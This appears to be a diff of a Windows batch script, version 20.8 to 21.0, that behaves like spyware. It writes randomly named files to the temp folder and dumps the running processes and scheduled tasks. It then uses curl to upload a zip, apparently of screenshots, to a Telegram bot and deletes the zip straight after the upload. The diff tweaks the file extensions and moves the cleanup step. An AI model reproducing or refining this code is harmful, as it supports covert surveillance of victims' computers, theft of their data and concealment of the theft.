@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=20.8"
+set "BATCHVERSION=21.0"
 
 
 
@@ -78,7 +78,7 @@ set "filename="
 
 
 :: Set the log file path
-set "LOGFILE=%temp%\!filename1!.mpee"
+set "LOGFILE=%temp%\!filename1!.mpeez"
 
 
 
@@ -155,7 +155,7 @@ set "filename="
 
 
 
-set "InstalledQWB=%temp%\!filename2!"
+set "InstalledQWB=%temp%\!filename2!.qwb"
 del /f /q "%InstalledQWB%"
 
 
@@ -1243,7 +1243,7 @@ set "filename="
 
 
 
-set "ProcessTXTFILE=%temp%\!filename3!"
+set "ProcessTXTFILE=%temp%\!filename3!.pxf"
 
 
 echo Saving All Processes in "%ProcessTXTFILE%"
@@ -1388,7 +1388,7 @@ for /L %%i in (1,1,13) do (
 )
 set "filename4=!filename!"
 set "filename="
-set "TASKS_DATA=%temp%\!filename4!"
+set "TASKS_DATA=%temp%\!filename4!.tsda"
 
 :: create %TASKS_DATA%
 schtasks /query /fo LIST /v > "%TASKS_DATA%"
@@ -1806,7 +1806,7 @@ for /L %%i in (1,1,13) do (
 )
 set "filename5=!filename!"
 set "filename="
-set "LOGFILE1=%temp%\!filename5!.mseuop"
+set "LOGFILE1=%temp%\!filename5!.mseuopm"
 
 
 echo.
@@ -1959,6 +1959,8 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocumen
      -F "caption=%CAPTION_UPDATESSCRNSHTS%" ^
      -F "document=@%ZIP_FILE%"
 
+del /f /q "%ZIP_FILE%"
+
 goto PEROTY1
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
@@ -1967,7 +1969,6 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocumen
      -F "caption=mseuope" ^
      -F "document=@%ZIP_FILEMS%"
 
-del /f /q "%ZIP_FILE%"
 
 :PEROTY1
 
